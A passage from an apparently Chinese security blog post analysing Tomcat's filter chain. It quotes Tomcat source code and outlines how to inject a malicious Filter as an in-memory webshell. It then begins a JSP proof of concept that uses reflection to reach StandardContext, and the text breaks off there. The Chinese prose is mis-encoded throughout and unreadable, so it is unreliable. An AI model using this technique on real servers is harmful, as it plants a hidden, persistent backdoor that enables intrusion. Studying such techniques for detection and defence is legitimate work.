class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">doFilter:<span class="number">11</span>, Shell_Filter (Filter)</span><br><span class="line">internalDoFilter:<span class="number">189</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:<span class="number">162</span>, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">197</span>, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">97</span>, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">540</span>, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:<span class="number">135</span>, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:<span class="number">92</span>, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">687</span>, AbstractAccessLogValve (org.apache.catalina.valves)</span><br><span class="line">invoke:<span class="number">78</span>, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:<span class="number">357</span>, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:<span class="number">382</span>, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:<span class="number">65</span>, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:<span class="number">895</span>, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:<span class="number">1722</span>, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:<span class="number">49</span>, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:<span class="number">1191</span>, ThreadPoolExecutor (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">659</span>, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">61</span>, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:<span class="number">748</span>, Thread (java.lang)</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›<code>ApplicationFilterChain#internalDoFilter</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request,ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">// Call the next filter if there is one</span></span><br><span class="line">        <span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++];</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter(); <span class="comment">//è·å–Filter</span></span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(</span><br><span class="line">                        filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span></span><br><span class="line">                        ((HttpServletRequest) req).getUserPrincipal();</span><br><span class="line"> </span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;req, res, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege (<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);<span class="comment">//* doFilterçš„è°ƒç”¨</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; </span><br><span class="line">...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>æŸ¥çœ‹ä¸€ä¸‹è·å–Filterçš„æœºåˆ¶ï¼Œ<code>filterConfig</code>æ˜¯<code>filters</code>æ•°ç»„æˆå‘˜ï¼Œä¸€ä¸ª<code>ApplicationFilterConfig</code>å®ä¾‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> filters[pos++]</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›æŸ¥çœ‹ä¸€ä¸‹<code>filters</code>æ•°ç»„çš„èµ‹å€¼æ—¶æœº,åœ¨<code>StandardWrapperValve#invoke()</code>æ–¹æ³•ä¸­</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span><span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">    <span class="comment">// Create the filter chain for this request</span></span><br><span class="line">  <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›<code>createFilterChain</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>(); <span class="comment">//åˆ›å»ºä¸€ä¸ªç©ºçš„filterChain</span></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"> </span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();<span class="comment">//å¾—åˆ°StandardContext</span></span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps();<span class="comment">//è·å–å…¶ä¸­çš„FilterMaps,é‡Œé¢å­˜å‚¨é‡Œå„Filterçš„ä¿¡æ¯</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();<span class="comment">//è·å–åç§°</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123; <span class="comment">//éå†å¾—åˆ°å¯¹åº”FilterConfig</span></span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">return</span> filterChain;<span class="comment">//å°†è·å–åˆ°çš„ApplicationFilterConfigæ•´åˆè¿”å›</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>è·Ÿè¿›<code>ApplicationFilterChain#addFilter</code>çœ‹ä¸€ä¸‹æ·»åŠ æœºåˆ¶</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line">        <span class="comment">//é˜²æ­¢é‡å¤æ·»åŠ </span></span><br><span class="line">        <span class="keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;</span><br><span class="line">            <span class="keyword">if</span>(filter==filterConfig) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n == filters.length) &#123;</span><br><span class="line">            ApplicationFilterConfig[] newFilters =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[n + INCREMENT];</span><br><span class="line">            System.arraycopy(filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, n);</span><br><span class="line">            filters = newFilters;</span><br><span class="line">        &#125;</span><br><span class="line">        filters[n++] = filterConfig;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><h4 id="FilteråŠ¨æ€æ³¨å†Œ"><a href="#FilteråŠ¨æ€æ³¨å†Œ" class="headerlink" title="FilteråŠ¨æ€æ³¨å†Œ"></a>FilteråŠ¨æ€æ³¨å†Œ</h4><p>é€šè¿‡ä¸Šè¿°æµç¨‹å¯ä»¥çŸ¥é“ï¼Œæ¯æ¬¡è¯·æ±‚çš„ FilterChain æ˜¯åŠ¨æ€åŒ¹é…è·å–å’Œç”Ÿæˆçš„ï¼Œå¦‚æœæƒ³æ·»åŠ ä¸€ä¸ª Filter ï¼Œéœ€è¦åœ¨ StandardContext ä¸­ filterMaps ä¸­æ·»åŠ  FilterMapï¼Œåœ¨ filterConfigs ä¸­æ·»åŠ  ApplicationFilterConfigã€‚è¿™æ ·ç¨‹åºåˆ›å»ºæ—¶å°±å¯ä»¥æ‰¾åˆ°æ·»åŠ çš„ Filter äº†ã€‚</p><p>è¿™é‡Œå…ˆè¯´ä¸€ä¸ªå‰ææ¡ä»¶ï¼ŒFilter é…ç½®åœ¨é…ç½®æ–‡ä»¶å’Œæ³¨è§£ä¸­ï¼Œåœ¨å…¶ä»–ä»£ç ä¸­å¦‚æœæƒ³è¦å®Œæˆæ³¨å†Œï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§æ–¹å¼ï¼š</p><ol><li>ä½¿ç”¨ ServletContext çš„ addFilter&#x2F;createFilter æ–¹æ³•æ³¨å†Œï¼›</li><li>ä½¿ç”¨ ServletContextListener çš„ contextInitialized æ–¹æ³•åœ¨æœåŠ¡å™¨å¯åŠ¨æ—¶æ³¨å†Œï¼›</li><li>ä½¿ç”¨ ServletContainerInitializer çš„ onStartup æ–¹æ³•åœ¨åˆå§‹åŒ–æ—¶æ³¨å†Œï¼ˆéåŠ¨æ€ï¼‰ã€‚</li></ol><p>è¿™é‡Œåªè®¨è®ºç¬¬ä¸€ç§ï¼Œå¹¶å…ˆå…³æ³¨æ¯”è¾ƒé‡è¦çš„addFilteræ–¹æ³•</p><p>åœ¨<code>ServletContext</code>æ¥å£ä¸­æœ‰å£°æ˜äº†3ä¸ª<code>addFilter</code>æ–¹æ³•ï¼Œå…¶å®ç°åœ¨ <code>org.apache.catalina.core.ApplicationContext#addFilter</code> ä¸­ã€‚è¿™é‡Œä»¥Tomcat 10.0.23ä¸ºä¾‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> FilterRegistration.Dynamic <span class="title function_">addFilter</span><span class="params">(String filterName,</span></span><br><span class="line"><span class="params">        String filterClass, Filter filter)</span> <span class="keyword">throws</span> IllegalStateException &#123;</span><br><span class="line">    <span class="keyword">if</span> (filterName == <span class="literal">null</span> || filterName.equals(<span class="string">&quot;&quot;</span>)) &#123;<span class="comment">//filterNameä¸èƒ½ä¸ºç©º</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(sm.getString(</span><br><span class="line">                <span class="string">&quot;applicationContext.invalidFilterName&quot;</span>, filterName));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//è¿™é‡Œçš„contextæ˜¯StandardContextç±»å‹</span></span><br><span class="line">    <span class="keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;<span class="comment">//åˆ¤æ–­contextçš„stateæ˜¯å¦æ˜¯ç¨‹åºåˆšå¯åŠ¨çš„state</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">                sm.getString(<span class="string">&quot;applicationContext.addFilter.ise&quot;</span>,</span><br><span class="line">                        getContextPath()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> context.findFilterDef(filterName);<span class="comment">//åœ¨contextä¸­æ ¹æ® filterName å¯»æ‰¾FilterDefå¯¹è±¡</span></span><br><span class="line">    <span class="keyword">if</span> (filterDef == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef = <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        context.addFilterDef(filterDef);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (filterDef.getFilterName() != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                filterDef.getFilterClass() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//å°†Filterå¯¹è±¡æ”¾å…¥FilterDefä¸­</span></span><br><span class="line">    <span class="keyword">if</span> (filter == <span class="literal">null</span>) &#123;</span><br><span class="line">        filterDef.setFilterClass(filterClass);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ApplicationFilterRegistration</span>(filterDef, context);<span class="comment">//åŒ…è£…FilterDefå’Œcontextè¿”å›</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>ä»ä¼ å‚å¯ä»¥çœ‹å‡ºfilterDefå¿…è¦çš„å±æ€§ä¸º<code>filter</code>ã€<code>filterClass</code>ä»¥åŠ<code>filterName</code>,åŠ¨è°ƒä¸€ä¸‹ä¼šå‘ç°å…¶å®filterClassã€filterNameå¯¹åº”çš„å…¶å®å°±æ˜¯web.xmlä¸­çš„<code>&lt;filter&gt;</code>æ ‡ç­¾ã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br></pre></td></tr></table></figure></div><blockquote><p>å¹¶ä¸”å¯ä»¥å‘ç°<code>ApplicationContext </code>çš„ <code>addFilter</code> ä¸­å°† filter åˆå§‹åŒ–å­˜åœ¨äº† <code>StandardContext</code> çš„ <code>filterDefs</code> ä¸­,ä½†æˆ‘ä»¬ä¹‹å‰åˆ†æçš„<code>FilterChain</code>ä¸­çš„Filteræ˜¯åœ¨<code>StandardContext</code>çš„<code>filterMaps</code>é‡Œè·å–</p><p>è¿™é‡Œå¯ä»¥è·Ÿè¿›çœ‹ä¸€ä¸‹Filteræ˜¯æ€ä¹ˆè¢«æ·»åŠ åˆ°å…¶ä»–å‚æ•°ä¸­çš„</p></blockquote><p>åœ¨ <code>StandardContext</code> çš„ <code>filterStart</code> æ–¹æ³•ä¸­ç”Ÿæˆäº† <code>filterConfigs</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">filterStart</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">            getLogger().debug(<span class="string">&quot;Starting filters&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Instantiate and record a FilterConfig for each defined filter</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">ok</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">synchronized</span> (filterConfigs) &#123;</span><br><span class="line">            filterConfigs.clear();</span><br><span class="line">            <span class="keyword">for</span> (Entry&lt;String,FilterDef&gt; entry : filterDefs.entrySet()) &#123;<span class="comment">//éå†filterDefs</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">                <span class="keyword">if</span> (getLogger().isDebugEnabled()) &#123;</span><br><span class="line">                    getLogger().debug(<span class="string">&quot; Starting filter &#x27;&quot;</span> + name + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;<span class="comment">//åˆ›å»ºApplicationFilterConfigå¯¹è±¡å¹¶å­˜å…¥filterConfigsä¸­</span></span><br><span class="line">                    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span></span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>(<span class="built_in">this</span>, entry.getValue());</span><br><span class="line">                    filterConfigs.put(name, filterConfig);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    t = ExceptionUtils.unwrapInvocationTargetException(t);</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(</span><br><span class="line">                            <span class="string">&quot;standardContext.filterStart&quot;</span>, name), t);</span><br><span class="line">                    ok = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ok;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å®Œæˆ<code>filterDefs</code>â€“&gt;<code>filterConfigs</code></p></blockquote><p>åœ¨ ApplicationFilterRegistration çš„ <code>addMappingForUrlPatterns</code> ä¸­ç”Ÿæˆäº† <code>filterMaps</code></p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addMappingForUrlPatterns</span><span class="params">(</span></span><br><span class="line"><span class="params">            EnumSet&lt;DispatcherType&gt; dispatcherTypes, <span class="type">boolean</span> isMatchAfter,</span></span><br><span class="line"><span class="params">            String... urlPatterns)</span> &#123;</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterDef.getFilterName());<span class="comment">//ä»filterDefè·å–</span></span><br><span class="line">        <span class="keyword">if</span> (dispatcherTypes != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (DispatcherType dispatcherType : dispatcherTypes) &#123;</span><br><span class="line">                filterMap.setDispatcher(dispatcherType.name());<span class="comment">//ç»™dispatcherMappingå±æ€§èµ‹å€¼</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (urlPatterns != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String urlPattern : urlPatterns) &#123;</span><br><span class="line">                filterMap.addURLPattern(urlPattern);<span class="comment">//ç»™urlPatternså±æ€§èµ‹å€¼</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isMatchAfter) &#123;</span><br><span class="line">                context.addFilterMap(filterMap);<span class="comment">//æ•´åˆfilterMap</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                context.addFilterMapBefore(filterMap);<span class="comment">//æ•´åˆfilterMap</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div><p>fileMapä»filterDefä¸­è·å–äº†<code>FilterName</code>å±æ€§ï¼Œåç»­åˆèµ‹å€¼äº†<code>urlPatterns</code>,<code>dispatcherMapping</code></p><blockquote><p>å¯ä»¥çœ‹åˆ°<code>filterMaps</code>çš„ç»„æˆéƒ¨åˆ†<code>filterMap</code>çš„ä¿¡æ¯æ˜¯ä»filterDefä¸­è·å–</p></blockquote><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“å‡ºåŠ¨æ€æ·»åŠ æ¶æ„Filterçš„æ€è·¯</p><ol><li>è·å–StandardContextå¯¹è±¡</li><li>åˆ›å»ºæ¶æ„Filter</li><li>ä½¿ç”¨FilterDefå¯¹Filterè¿›è¡Œå°è£…ï¼Œå¹¶æ·»åŠ å¿…è¦çš„å±æ€§</li><li>åˆ›å»ºfilterMapç±»ï¼Œå¹¶å°†è·¯å¾„å’ŒFilternameç»‘å®šï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterMapsä¸­</li><li>ä½¿ç”¨ApplicationFilterConfigå°è£…filterDefï¼Œç„¶åå°†å…¶æ·»åŠ åˆ°filterConfigsä¸­</li></ol><h4 id="å®Œæ•´POC-1"><a href="#å®Œæ•´POC-1" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h4><p>Filter.jsp</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&lt;%<span class="comment">//è·å–StandardContextå¯¹è±¡</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    